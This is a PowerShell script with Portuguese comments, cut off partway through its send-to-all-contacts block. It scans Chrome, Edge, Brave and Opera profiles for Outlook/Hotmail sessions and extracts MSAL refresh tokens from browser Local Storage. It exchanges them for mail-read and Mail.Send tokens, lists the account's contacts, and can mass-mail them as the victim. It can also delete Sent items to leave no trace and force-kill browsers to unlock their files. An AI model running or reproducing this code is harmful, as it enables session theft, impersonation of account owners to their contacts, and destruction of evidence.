#Requires -Version 5.1
<#
rehot.ps1 — detector + sender de sessões OWA/Hotmail (port do rehot.py).

Só .NET Framework (Windows PowerShell 5.1). Sem dependências externas.

Fluxo:
  1. Enumera navegadores (Chrome/Edge/Brave/Opera/Opera GX) e TODOS os perfis.
  2. Sinal de sessão: cookie MSPAuth/MSPSec em .live.com (busca crua no banco Cookies).
  3. Extrai o refresh token MSAL do Local Storage/leveldb (descomprimindo blocos
     SNAPPY — o mesmo truque do Python). O refresh real está em "secret".
  4. O refresh token e o client sao extraidos do leveldb do PC onde roda (NAO
     hardcoded). Troca por token READ e WRITE (tentando os clients de mail do
     OWA conhecidos, com o client descoberto como fallback) e valida via REST
     API v2.0 /me.
  5. Decisão: qual perfil usar; se houver mais de um, usa todos.
  6. -SendTo <email>: envia um e-mail de teste.

Uso:
  powershell -File rehot.ps1                 # só detecta
  powershell -File rehot.ps1 -SendTo a@b.com # detecta + envia teste
  powershell -File rehot.ps1 -CloseBrowsers  # fecha navegadores antes (libera perfis travados)
  powershell -File rehot.ps1 -ToAllContacts -Subject "Oi" -Body "msg" [-MaxContacts 50]
      # lista a agenda do cliente e envia a mensagem designada a todos os contatos
  powershell -File rehot.ps1 -ToAllContacts -Subject "Oi" -Body "msg" -SelfDelete
      # idem + apaga as mensagens enviadas (por assunto) da pasta Enviados
  powershell -File rehot.ps1 -SelfDeleteAll   # apaga TUDO em Enviados (rastro zero)
#>
param(
    [string]$SendTo = "",
    [switch]$NoValidate,
    [switch]$CloseBrowsers,
    [switch]$ToAllContacts,   # envia a mensagem designada para TODOS os contatos da agenda
    [string]$Subject = "",    # assunto da mensagem (vazio = padrão de teste)
    [string]$Body = "",       # corpo da mensagem (vazio = padrão de teste)
    [int]$MaxContacts = 0,    # trava de segurança: 0 = sem limite
    [switch]$SelfDelete,      # após enviar, apaga as mensagens desta execução (por assunto)
    [switch]$SelfDeleteAll    # apaga TUDO em Enviados (implica -SelfDelete; rastro zero)
)

$ErrorActionPreference = "Stop"
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

# ---------------- constantes ----------------
$APPDATA      = $env:APPDATA
$LOCALAPPDATA = $env:LOCALAPPDATA
# Client IDs do OWA = registros de app da Microsoft (iguais em TODO PC; NAO sao
# segredo do PC). O que varia por PC e o REFRESH TOKEN, extraido do leveldb do
# navegador (Get-MSALToken). O client descoberto no leveldb tem prioridade; as
# listas abaixo sao fallback conhecido p/ quando o PC usar outro client do OWA.
$OWA_KNOWN_CLIENTIDS      = @("9199bf20-a13f-4107-85dc-02114787ef48")  # SPA do OWA (read)
$OWA_KNOWN_MAIL_CLIENTIDS = @("6bc89243-be1c-423a-99ec-b9a45b8b568b")  # API de mail (write)
$OWA_READ_SCOPE  = "https://outlook.office.com/.default"
$OWA_TOKEN_URL   = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
$OWA_API_BASE    = "https://outlook.office.com/api/v2.0"
$OWA_ORIGIN      = "https://outlook.live.com"

$browsers = @(
    @{ Name = "Chrome";     Root = Join-Path $LOCALAPPDATA "Google\Chrome\User Data" },
    @{ Name = "Edge";       Root = Join-Path $LOCALAPPDATA "Microsoft\Edge\User Data" },
    @{ Name = "Brave";      Root = Join-Path $LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data" },
    @{ Name = "Opera";      Root = Join-Path $APPDATA "Opera Software\Opera Stable" },
    @{ Name = "Opera GX";   Root = Join-Path $APPDATA "Opera Software\Opera GX Stable" }
)

# ---------------- leitura de arquivo (mesmo travado) ----------------
$script:_FileIOReady = $false
function Ensure-FileIO {
    if ($script:_FileIOReady) { return }
    $sig = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
public static class FileIO {
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr CreateFileW(string n, uint a, uint s, IntPtr sec, uint d, uint f, IntPtr t);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadFile(IntPtr h, byte[] b, uint n, out uint r, IntPtr o);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr h);
    public static byte[] ReadAll(string path) {
        IntPtr h = CreateFileW(path, 0x80000000, 0x7, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (h == IntPtr.Zero || h == new IntPtr(-1)) return null;
        using (var ms = new MemoryStream()) {
            byte[] buf = new byte[1 << 20]; uint r;
            while (ReadFile(h, buf, (uint)buf.Length, out r, IntPtr.Zero) && r > 0)
                ms.Write(buf, 0, (int)r);
            CloseHandle(h);
            return ms.ToArray();
        }
    }
}
'@
    try { Add-Type -TypeDefinition $sig } catch {}
    $script:_FileIOReady = $true
}

# ---------------- snappy em C# (rápido) ----------------
# O loop byte-a-byte do PowerShell é ~650x mais lento que C#. Compilamos um
# helper via Add-Type que faz o walk + descompressão de todo o arquivo .ldb.
$script:_SnappyReady = $false
function Ensure-Snappy {
    if ($script:_SnappyReady) { return }
    $sig = @'
using System;
using System.IO;
public static class SnappyLdb {
    static int ReadVarint(byte[] d, int pos, out int val) {
        int result = 0, shift = 0;
        while (true) {
            if (pos >= d.Length) { val = 0; return -1; }
            byte b = d[pos]; pos++;
            result |= (b & 0x7F) << shift;
            if ((b & 0x80) == 0) { val = result; return pos; }
            shift += 7;
            if (shift > 35) { val = 0; return -1; }
        }
    }
    static int SnappyOne(byte[] src, int start, byte[] dst, out int consumed) {
        int declared;
        int pos = start;
        try {
            int p = ReadVarint(src, pos, out declared);
            if (p < 0) { consumed = 0; return -1; }
            pos = p;
            if (declared <= 0 || declared > (1 << 22)) { consumed = 0; return -1; }
            int outLen = 0;
            while (pos < src.Length && outLen < declared) {
                byte tag = src[pos]; pos++;
                int t = tag & 3;
                if (t == 0) {
                    int l = (tag >> 2) + 1;
                    if (l > 60) {
                        int nb = l - 60;
                        long lv = 0;
                        for (int i = 0; i < nb; i++) lv |= (long)src[pos + i] << (i * 8);
                        pos += nb;
                        l = (int)lv + 1;
                    }
                    if (l <= 0 || pos + l > src.Length) { consumed = 0; return -1; }
                    Buffer.BlockCopy(src, pos, dst, outLen, l);
                    pos += l; outLen += l;
                } else if (t == 1) {
                    int l = ((tag >> 2) & 0x7) + 4;
                    if (pos >= src.Length) { consumed = 0; return -1; }
                    int off = ((tag >> 5) << 8) | src[pos]; pos++;
                    if (off <= 0 || off > outLen) { consumed = 0; return -1; }
                    if (off >= l) Buffer.BlockCopy(dst, outLen - off, dst, outLen, l);
                    else for (int i = 0; i < l; i++) dst[outLen + i] = dst[outLen + i - off];
                    outLen += l;
                } else if (t == 2) {
                    int l = (tag >> 2) + 1;
                    if (pos + 2 > src.Length) { consumed = 0; return -1; }
                    int off = src[pos] | (src[pos + 1] << 8); pos += 2;
                    if (off <= 0 || off > outLen) { consumed = 0; return -1; }
                    if (off >= l) Buffer.BlockCopy(dst, outLen - off, dst, outLen, l);
                    else for (int i = 0; i < l; i++) dst[outLen + i] = dst[outLen + i - off];
                    outLen += l;
                } else {
                    int l = (tag >> 2) + 1;
                    if (pos + 4 > src.Length) { consumed = 0; return -1; }
                    int off = src[pos] | (src[pos + 1] << 8) | (src[pos + 2] << 16) | (src[pos + 3] << 24); pos += 4;
                    if (off <= 0 || off > outLen) { consumed = 0; return -1; }
                    if (off >= l) Buffer.BlockCopy(dst, outLen - off, dst, outLen, l);
                    else for (int i = 0; i < l; i++) dst[outLen + i] = dst[outLen + i - off];
                    outLen += l;
                }
            }
            if (outLen != declared) { consumed = 0; return -1; }
            consumed = pos;
            return declared;
        } catch { consumed = 0; return -1; }
    }
    public static byte[] DecompressFile(byte[] data) {
        if (data == null || data.Length < 48) return null;
        ulong magic = BitConverter.ToUInt64(data, data.Length - 8);
        if (magic != 0x88328E1720020B68UL && magic != 0xDB4775248B80FB57UL) return null;
        int metaOff, metaLen, idxOff, idxLen;
        int p = data.Length - 48;
        int a = ReadVarint(data, p, out metaOff); if (a < 0) return null;
        int b = ReadVarint(data, a, out metaLen); if (b < 0) return null;
        int c = ReadVarint(data, b, out idxOff); if (c < 0) return null;
        int d2 = ReadVarint(data, c, out idxLen); if (d2 < 0) return null;
        int end = Math.Min(idxOff, data.Length - 48);
        var ms = new MemoryStream();
        int pos = 0;
        byte[] block = new byte[1 << 22];
        int consumed;
        while (pos < end) {
            int declared = SnappyOne(data, pos, block, out consumed);
            if (declared < 0) { pos++; continue; }
            ms.Write(block, 0, declared);
            pos = consumed;
        }
        return ms.ToArray();
    }
}
'@
    try { Add-Type -TypeDefinition $sig } catch {}
    $script:_SnappyReady = $true
}

function Read-FileBytes([string]$path) {
    try { return [System.IO.File]::ReadAllBytes($path) } catch {}
    Ensure-FileIO
    return [FileIO]::ReadAll($path)
}

# ---------------- snappy (port do leveldb_scan.py) ----------------
function Read-Varint([byte[]]$buf, [ref]$pos) {
    $result = [int64]0
    $shift = 0
    while ($true) {
        $b = $buf[$pos.Value]
        $pos.Value++
        $result = $result -bor ([int64]($b -band 0x7F) -shl $shift)
        if (($b -band 0x80) -eq 0) { return $result }
        $shift += 7
    }
}

function Expand-Snappy([byte[]]$src, [int]$start) {
    # retorna [PSCustomObject]@{Out;Consumed} ou $null se inválido
    $pos = $start
    $n = Read-Varint $src ([ref]$pos)
    if ($n -le 0 -or $n -gt (1 -shl 22)) { return $null }
    $out = New-Object byte[] $n
    $outLen = 0
    try {
        while ($pos -lt $src.Length -and $outLen -lt $n) {
            $tag = $src[$pos]; $pos++
            $t = $tag -band 3
            if ($t -eq 0) {                       # literal
                $l = ($tag -shr 2) + 1
                if ($l -gt 60) {
                    $nb = $l - 60
                    $lv = [int64]0
                    for ($i = 0; $i -lt $nb; $i++) { $lv = $lv -bor ([int64]$src[$pos + $i] -shl ($i * 8)) }
                    $pos += $nb
                    $l = [int]($lv + 1)
                }
                [Array]::Copy($src, $pos, $out, $outLen, $l)
                $pos += $l; $outLen += $l
            }
            elseif ($t -eq 1) {                   # copy, offset 1 byte
                $l = (($tag -shr 2) -band 0x7) + 4
                $off = (($tag -shr 5) -shl 8) -bor $src[$pos]; $pos++
                if ($off -ge $l) { [Array]::Copy($out, $outLen - $off, $out, $outLen, $l) }
                else { for ($i = 0; $i -lt $l; $i++) { $out[$outLen + $i] = $out[$outLen + $i - $off] } }
                $outLen += $l
            }
            elseif ($t -eq 2) {                   # copy, offset 2 bytes
                $l = ($tag -shr 2) + 1
                $off = $src[$pos] -bor ($src[$pos + 1] -shl 8); $pos += 2
                if ($off -ge $l) { [Array]::Copy($out, $outLen - $off, $out, $outLen, $l) }
                else { for ($i = 0; $i -lt $l; $i++) { $out[$outLen + $i] = $out[$outLen + $i - $off] } }
                $outLen += $l
            }
            else {                                # copy, offset 4 bytes
                $l = ($tag -shr 2) + 1
                $off = $src[$pos] -bor ($src[$pos + 1] -shl 8) -bor ($src[$pos + 2] -shl 16) -bor ($src[$pos + 3] -shl 24)
                $pos += 4
                if ($off -ge $l) { [Array]::Copy($out, $outLen - $off, $out, $outLen, $l) }
                else { for ($i = 0; $i -lt $l; $i++) { $out[$outLen + $i] = $out[$outLen + $i - $off] } }
                $outLen += $l
            }
        }
    } catch { return $null }
    if ($outLen -ne $n) { return $null }
    return [PSCustomObject]@{ Out = $out; Consumed = $pos }
}

function Get-LeveldbBlob([string]$path) {
    $data = Read-FileBytes $path
    if (-not $data -or $data.Length -lt 48) { return $null }
    # caminho rápido: descompressão em C# (Add-Type) — ~650x mais rápido que o loop PS
    Ensure-Snappy
    try {
        $blob = [SnappyLdb]::DecompressFile($data)
        if ($blob) { return $blob }
    } catch {}
    # fallback: walk em PowerShell (lento, mas funciona sem Add-Type)
    # ToInt64 (não ToUInt64): os literais hex > Int64max são parseados como Int64
    # negativo no PowerShell, então o magic precisa ser lido como Int64 p/ bater.
    $magic = [BitConverter]::ToInt64($data, $data.Length - 8)
    if ($magic -ne 0x88328E1720020B68 -and $magic -ne 0xDB4775248B80FB57) { return $null }
    $p = $data.Length - 48
    $metaOff = Read-Varint $data ([ref]$p)
    $metaLen = Read-Varint $data ([ref]$p)
    $idxOff  = Read-Varint $data ([ref]$p)
    $idxLen  = Read-Varint $data ([ref]$p)
    $end = [Math]::Min([int]$idxOff, $data.Length - 48)
    $ms = New-Object System.IO.MemoryStream
    $pos = 0
    while ($pos -lt $end) {
        $r = Expand-Snappy $data $pos
        if ($null -eq $r) { $pos++; continue }
        $ms.Write($r.Out, 0, $r.Out.Length)
        $pos = $r.Consumed
    }
    return $ms.ToArray()
}

# ---------------- MSAL: extrai refresh token + client ----------------
function Get-MSALToken([string]$leveldbDir) {
    if (-not (Test-Path $leveldbDir)) { return $null }
    $fallback = $null
    foreach ($f in (Get-ChildItem $leveldbDir -Filter *.ldb -ErrorAction SilentlyContinue)) {
        $blob = Get-LeveldbBlob $f.FullName
        if (-not $blob -or $blob.Length -eq 0) { continue }
        $blobStr = [System.Text.Encoding]::ASCII.GetString($blob)
        $searchStart = 0
        while ($true) {
            $idx = $blobStr.IndexOf('"credentialType":"RefreshToken"', $searchStart)
            if ($idx -lt 0) { break }
            $openBrace  = $blobStr.LastIndexOf('{', $idx)
            $closeBrace = $blobStr.IndexOf('}', $idx)
            if ($openBrace -ge 0 -and $closeBrace -gt $openBrace) {
                $json = $blobStr.Substring($openBrace, $closeBrace - $openBrace + 1)
                try {
                    $obj = $json | ConvertFrom-Json
                    if ($obj.secret -and $obj.clientId) {
                        if ($OWA_KNOWN_CLIENTIDS -contains $obj.clientId) {
                            return @{ refresh = $obj.secret; client = $obj.clientId }
                        }
                        if ($null -eq $fallback) {
                            $fallback = @{ refresh = $obj.secret; client = $obj.clientId }
                        }
                    }
                } catch {}
            }
            $searchStart = $idx + 1
        }
    }
    return $fallback
}

# ---------------- cookies (sinal de sessão, busca crua) ----------------
function Test-MSCookies([string]$profileDir) {
    $net    = Join-Path $profileDir "Network\Cookies"
    $legacy = Join-Path $profileDir "Cookies"
    $src = if (Test-Path $net) { $net } elseif (Test-Path $legacy) { $legacy } else { $null }
    if (-not $src) { return @{ state = "absent"; ms = $false; outlook = 0 } }
    $bytes = Read-FileBytes $src
    if (-not $bytes) { return @{ state = "locked"; ms = $false; outlook = 0 } }
    $text = [System.Text.Encoding]::ASCII.GetString($bytes)
    $ms = $text.Contains("MSPAuth") -or $text.Contains("MSPSec")
    $outlook = ([regex]::Matches($text, "outlook\.live\.com|outlook\.office\.com")).Count
    return @{ state = "ok"; ms = $ms; outlook = $outlook }
}

# ---------------- HTTP: troca / validação / envio ----------------
function UrlEnc([string]$s) { [System.Uri]::EscapeDataString($s) }

# $script:LastExchangeError guarda o motivo da última troca que falhou (p/
# diagnosticar "msal=true mas token_read=null" — ex.: refresh revogado, MFA, rede).
$script:LastExchangeError = $null
function Exchange-OWAToken([string]$refresh, [string]$client, [string]$scope) {
    $script:LastExchangeError = $null
    $body = "grant_type=refresh_token&refresh_token=$(UrlEnc $refresh)&client_id=$(UrlEnc $client)&scope=$(UrlEnc $scope)"
    # HttpWebRequest (nao Invoke-WebRequest): o IWR 5.1 consome o corpo da resposta
    # antes do catch, deixando o erro vazio. Aqui capturamos status + corpo de
    # verdade (ex.: AADSTS70000 = grant expirado, usuario precisa entrar de novo).
    # Tudo dentro do try: falha de rede no GetRequestStream nao pode derrubar o
    # script inteiro ($ErrorActionPreference=Stop).
    try {
        $req = [System.Net.HttpWebRequest]::Create($OWA_TOKEN_URL)
        $req.Method = "POST"
        $req.ContentType = "application/x-www-form-urlencoded"
        $req.Headers.Add("Origin", $OWA_ORIGIN)
        $req.Timeout = 30000
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $rs = $req.GetRequestStream()
        $rs.Write($bytes, 0, $bytes.Length)
        $rs.Close()
        $resp = $req.GetResponse()
        $sr = New-Object System.IO.StreamReader($resp.GetResponseStream())
        $content = $sr.ReadToEnd()
        $resp.Close()
        $j = $content | ConvertFrom-Json
        return $j.access_token
    } catch [System.Net.WebException] {
        $code = 0; $errBody = ""
        $hr = $_.Exception.Response
        if ($hr) {
            $code = [int]$hr.StatusCode
            try { $sr = New-Object System.IO.StreamReader($hr.GetResponseStream()); $errBody = $sr.ReadToEnd(); $hr.Close() } catch {}
        }
        $script:LastExchangeError = "HTTP $code | $errBody"
        return $null
    } catch {
        $script:LastExchangeError = $_.Exception.Message
        return $null
    }
}

function Test-OWAToken([string]$token) {
    try {
        $resp = Invoke-WebRequest -Uri "$OWA_API_BASE/me" -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
        $j = $resp.Content | ConvertFrom-Json
        $email = $j.EmailAddress
        if ($email -is [System.Management.Automation.PSCustomObject]) { $email = $email.Address }
        return @{ state = "valido"; email = $email }
    } catch {
        $code = 0
        if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
        if ($code -eq 401) { return @{ state = "expirado"; email = $null } }
        return @{ state = "erro"; email = $null }
    }
}

# Adquire token WRITE (Mail.Send) para o refresh token do PC onde roda.
# O client que FAZ a troca e sempre o dono do refresh token ($client, descoberto
# no leveldb); o que varia e o scope (api://<mailClient>/.default). Tenta, em
# ordem: os clients de mail conhecidos do OWA e, por fim, o proprio client
# descoberto (caso ele mesmo carregue Mail.Send). Retorna @{ token; mailClient;
# email } do primeiro que validar via /me, ou $null.
function Get-OWAWriteToken([string]$refresh, [string]$client) {
    $candidates = @($OWA_KNOWN_MAIL_CLIENTIDS) + @($client)
    foreach ($mc in ($candidates | Select-Object -Unique)) {
        if (-not $mc) { continue }
        $tok = Exchange-OWAToken $refresh $client "api://$mc/.default"
        if (-not $tok) { continue }
        $v = Test-OWAToken $tok
        if ($v.state -eq "valido") {
            return @{ token = $tok; mailClient = $mc; email = $v.email }
        }
    }
    return $null
}

function Send-OWAMail([string]$token, [string]$to, [string]$subject, [string]$body) {
    $payload = @{
        Message = @{
            Subject = $subject
            Body = @{ ContentType = "Text"; Content = $body }
            ToRecipients = @(@{ EmailAddress = @{ Address = $to } })
        }
        SaveToSentItems = $true
    } | ConvertTo-Json -Depth 5
    # corpo como byte[] UTF-8: Invoke-WebRequest 5.1 codifica string no charset
    # do sistema (Windows-1252), o que corrompe acentos e quebra o JSON (400).
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    try {
        $resp = Invoke-WebRequest -Uri "$OWA_API_BASE/me/sendMail" -Method Post -Body $bytes `
            -Headers @{ "Authorization" = "Bearer $token"; "Origin" = $OWA_ORIGIN } `
            -ContentType "application/json" -UseBasicParsing
        return @{ ok = ($resp.StatusCode -eq 202); status = [int]$resp.StatusCode; erro = $null }
    } catch {
        $code = 0; $erro = $null
        if ($_.Exception.Response) {
            $code = [int]$_.Exception.Response.StatusCode
            try {
                $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
                $erro = $sr.ReadToEnd()
            } catch {}
        }
        return @{ ok = $false; status = $code; erro = $erro }
    }
}

# ---------------- agenda de contatos (GET /me/contacts, paginado) ----------------
# Usa o MESMO token OWA (READ scope) que valida via /me — nao precisa de novo
# consent. Retorna array de @{ name; email } (primeiro endereco de cada contato
# que tenha e-mail). Contatos sem email (so telefone, por ex.) sao descartados.
function Get-OWAContacts([string]$token) {
    $result = @()
    $uri = "$OWA_API_BASE/me/contacts?`$top=200"
    while ($uri) {
        try {
            $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
        } catch { return $result }
        $j = $resp.Content | ConvertFrom-Json
        if ($j.value) {
            foreach ($c in $j.value) {
                $email = $null
                if ($c.emailAddresses -and $c.emailAddresses.Count -gt 0) { $email = $c.emailAddresses[0].address }
                if ($email) { $result += @{ name = $c.displayName; email = $email } }
            }
        }
        $uri = $j."@odata.nextLink"
    }
    return $result
}

# ---------------- SelfDelete: apaga da pasta Enviados ----------------
# Usa o token WRITE. $all=$true apaga TUDO em Enviados; $all=$false apaga so as
# cujo Subject bate EXATAMENTE com $subject (as que esta execucao enviou — nao
# toca no enviado pre-existente do cliente). Listagem paginada + retry em 429
# (Retry-After). DELETE /me/messages/{id} retorna 204. Retorna @{ apagadas;
# falhas; total_visto }.
function Remove-OWASentMessages([string]$token, [string]$subject, [bool]$all) {
    $apagadas = 0; $falhas = @(); $visto = 0
    $uri = "$OWA_API_BASE/me/messages?`$top=200"
    while ($uri) {
        # --- lista uma pagina (retry em 429) ---
        $j = $null
        for ($attempt = 0; $attempt -lt 3; $attempt++) {
            try {
                $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
                $j = $resp.Content | ConvertFrom-Json
                break
            } catch {
                $code = 0; if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
                if ($code -eq 429 -and $attempt -lt 2) {
                    $ra = 2; try { $ra = [int]$_.Exception.Response.Headers["Retry-After"] } catch {}
                    Start-Sleep -Seconds $ra
                } else { break }
            }
        }
        if (-not $j) { break }
        if ($j.value) {
            foreach ($m in $j.value) {
                $visto++
                $deletar = if ($all) { $true } else { ($m.Subject -eq $subject) }
                if (-not $deletar) { continue }
                # --- DELETE /me/messages/{id} (retry em 429) ---
                # Captura o erro (status + corpo) p/ diagnosticar: 403 ErrorAccessDenied
                # = token sem Mail.ReadWrite (le/envia mas nao apaga itens de mensagem).
                $ok = $false; $delCode = 0; $delErr = $null
                for ($attempt = 0; $attempt -lt 3; $attempt++) {
                    try {
                        $d = Invoke-WebRequest -Uri "$OWA_API_BASE/me/messages/$($m.id)" -Method Delete `
                            -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
                        $ok = ($d.StatusCode -eq 204)
                        break
                    } catch {
                        $delCode = 0; if ($_.Exception.Response) { $delCode = [int]$_.Exception.Response.StatusCode }
                        $delErr = $null
                        if ($_.Exception.Response) {
                            try { $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); $delErr = $sr.ReadToEnd() } catch {}
                        }
                        if ($delCode -eq 204) { $ok = $true; break }
                        if ($delCode -eq 429 -and $attempt -lt 2) {
                            $ra = 2; try { $ra = [int]$_.Exception.Response.Headers["Retry-After"] } catch {}
                            Start-Sleep -Seconds $ra
                        } else { break }
                    }
                }
                if ($ok) { $apagadas++ }
                else { $falhas += [PSCustomObject]@{ id = $m.id; status = $delCode; erro = $delErr } }
            }
        }
        $uri = $j."@odata.nextLink"
    }
    return @{ apagadas = $apagadas; falhas = $falhas; total_visto = $visto }
}

# ---------------- enumeração de perfis ----------------
function Get-Profiles([string]$root) {
    $result = @()
    if (-not (Test-Path $root)) { return $result }
    foreach ($entry in (Get-ChildItem $root -Directory -ErrorAction SilentlyContinue)) {
        $name = $entry.Name
        if ($name -eq "Default" -or $name -like "Profile *") {
            $hasCookies = Test-Path (Join-Path $entry.FullName "Network\Cookies")
            $hasLS      = Test-Path (Join-Path $entry.FullName "Local Storage\leveldb")
            if ($hasCookies -or $hasLS) { $result += @{ Name = $name; Dir = $entry.FullName } }
        }
    }
    if ($result.Count -eq 0) {
        # Opera: a própria raiz pode ser o perfil (sem sub-Default)
        if ((Test-Path (Join-Path $root "Network\Cookies")) -or (Test-Path (Join-Path $root "Local Storage\leveldb"))) {
            $result += @{ Name = (Split-Path $root -Leaf); Dir = $root }
        }
    }
    return $result
}

# ---------------- fechar navegadores (libera locks do leveldb/Cookies) ----------------
# Perfis com navegador aberto ficam BLOQUEADO_NAVEGADOR_ABERTO (arquivo travado).
# -CloseBrowsers mata os processos antes do scan e dá uma pausa p/ o SO soltar os
# handles. Retorna a lista de nomes de processo que estavam rodando e foram fechados.
function Close-Browsers {
    $procs = @("chrome", "msedge", "brave", "opera", "operagx")
    $fechados = @()
    foreach ($p in $procs) {
        $found = Get-Process -Name $p -ErrorAction SilentlyContinue
        if ($found) {
            $found | Stop-Process -Force -ErrorAction SilentlyContinue
            $fechados += $p
        }
    }
    if ($fechados.Count -gt 0) { Start-Sleep -Milliseconds 800 }
    return $fechados
}

# ---------------- análise de um perfil ----------------
function Analyze-Profile([string]$browser, [string]$pname, [string]$pdir, [bool]$validate) {
    $cookies = Test-MSCookies $pdir
    $leveldb = Join-Path $pdir "Local Storage\leveldb"
    $msal = Get-MSALToken $leveldb
    $display = $null
    try {
        $pref = Get-Content (Join-Path $pdir "Preferences") -Raw -ErrorAction Stop | ConvertFrom-Json
        $display = $pref.profile.name
    } catch {}

    $readTok = $writeTok = $writeClient = $null
    $validated = $null
    if ($validate -and $msal) {
        $readTok = Exchange-OWAToken $msal.refresh $msal.client $OWA_READ_SCOPE
        if ($readTok) {
            $validated = Test-OWAToken $readTok
            if ($validated.state -eq "valido") {
                $wt = Get-OWAWriteToken $msal.refresh $msal.client
                if ($wt) { $writeTok = $wt.token; $writeClient = $wt.mailClient }
            }
        }
    }

    if ($validated -and $validated.state -eq "valido") { $verdict = "LOGADO_TOKEN_VALIDO" }
    elseif ($cookies.ms -or $msal) { $verdict = "LOGADO_SESSAO_VIVA" }
    elseif ($cookies.state -eq "locked") { $verdict = "BLOQUEADO_NAVEGADOR_ABERTO" }
    else { $verdict = "SEM_SESSAO" }

    [PSCustomObject]@{
        navegador   = $browser
        perfil      = $pname
        perfil_nome = $display
        profile_dir = $pdir
        veredito    = $verdict
        cookies_ms  = $cookies.ms
        cookies_outlook = $cookies.outlook
        msal        = [bool]$msal
        msal_client = if ($msal) { $msal.client } else { $null }
        conta       = if ($validated) { $validated.email } else { $null }
        validacao   = $validated
        token_read  = $readTok
        token_write = $writeTok
        write_client = $writeClient
        exchange_error = if ($msal -and -not $readTok) { $script:LastExchangeError } else { $null }
    }
}

# ---------------- main ----------------
$validate = -not $NoValidate.IsPresent
$fechados = @()
if ($CloseBrowsers.IsPresent) { $fechados = @(Close-Browsers) }
$results = @()
foreach ($b in $browsers) {
    $profiles = Get-Profiles $b.Root
    foreach ($p in $profiles) {
        $results += Analyze-Profile $b.Name $p.Name $p.Dir $validate
    }
}

$validos    = @($results | Where-Object { $_.veredito -eq "LOGADO_TOKEN_VALIDO" })
$vivos      = @($results | Where-Object { $_.veredito -eq "LOGADO_SESSAO_VIVA" })
$bloqueados = @($results | Where-Object { $_.veredito -eq "BLOQUEADO_NAVEGADOR_ABERTO" })

if ($validos.Count -gt 0) {
    if ($validos.Count -gt 1) {
        $decisao = "MAIS DE UM Outlook logado com token válido -> USAR TODOS: " +
            (($validos | ForEach-Object { "$($_.navegador)/$($_.perfil) ($($_.conta))" }) -join "; ")
    } else {
        $r = $validos[0]
        $decisao = "USAR: $($r.navegador)/$($r.perfil) — conta $($r.conta) (token OWA validado via REST API v2.0 /me)"
    }
}
elseif ($vivos.Count -gt 0) {
    $decisao = "Sessão viva (cookie MSPAuth / refresh MSAL) mas token não validado -> trocar o refresh (scope api://<client de mail do OWA>/.default) em: " +
        (($vivos | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
}
elseif ($bloqueados.Count -gt 0) {
    $decisao = "Perfis com arquivos travados (navegador aberto) -> fechar o navegador e re-executar: " +
        (($bloqueados | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
}
else { $decisao = "NENHUMA sessão viva encontrada" }

if ($bloqueados.Count -gt 0 -and ($validos.Count -gt 0 -or $vivos.Count -gt 0)) {
    $decisao += " | ATENÇÃO: perfis ainda travados (pode haver OUTRA conta logada ali): " +
        (($bloqueados | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
}
$comWrite = @($validos | Where-Object { $_.token_write })
if ($comWrite.Count -gt 0) {
    $decisao += " | WRITE OK (Mail.Send): " + (($comWrite | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
}

# ---- modo -SendTo ----
$envio = $null
if ($SendTo) {
    $src = $validos | Where-Object { $_.token_write } | Select-Object -First 1
    if ($src) {
        $res = Send-OWAMail $src.token_write $SendTo "[TESTE EnvioHOT] rehot.ps1 -SendTo" "Envio de teste automático (PowerShell)"
        $envio = [PSCustomObject]@{ de = $src.conta; para = $SendTo; ok = $res.ok; status = $res.status; erro = $res.erro; perfil = "$($src.navegador)/$($src.perfil)" }
    }
    else {
        $cand = ($validos + $vivos) | Where-Object { $_.msal } | Select-Object -First 1
        if ($cand) {
            $msal = Get-MSALToken (Join-Path $cand.profile_dir "Local Storage\leveldb")
            $wtObj = if ($msal) { Get-OWAWriteToken $msal.refresh $msal.client } else { $null }
            $wt = if ($wtObj) { $wtObj.token } else { $null }
            if ($wt) {
                $res = Send-OWAMail $wt $SendTo "[TESTE EnvioHOT] rehot.ps1 -SendTo" "Envio de teste automático (PowerShell)"
                $envio = [PSCustomObject]@{ de = $cand.conta; para = $SendTo; ok = $res.ok; status = $res.status; perfil = "$($cand.navegador)/$($cand.perfil)" }
            } else {
                $envio = [PSCustomObject]@{ de = $cand.conta; para = $SendTo; ok = $false; status = "sem_token_write"; perfil = "$($cand.navegador)/$($cand.perfil)" }
            }
        } else {
            $envio = [PSCustomObject]@{ de = $null; para = $SendTo; ok = $false; status = "sem_perfil_com_refresh"; perfil = $null }
        }
    }
}

# ---- modo -ToAllContacts: lista a agenda e envia a mensagem designada a todos ----
# Usa o token READ p/ listar (Get-OWAContacts) e o token WRITE p/ enviar
# (Send-OWAMail, ja existente). -MaxContacts > 0 limita o total (trava de
# seguranca contra agenda gigante / throttle). Pausa curta entre envios.
$envioTodos = $null
if ($ToAllContacts.IsPresent) {
    $src = $validos | Where-Object { $_.token_write -and $_.token_read } | Select-Object -First 1
    $subject = if ($Subject) { $Subject } else { "[TESTE EnvioHOT] rehot -ToAllContacts" }
    $body    = if ($Body)    { $Body }    else { "Mensagem de teste para todos os contatos (PowerShell)" }
    if ($src) {
        $contatos = @(Get-OWAContacts $src.token_read)
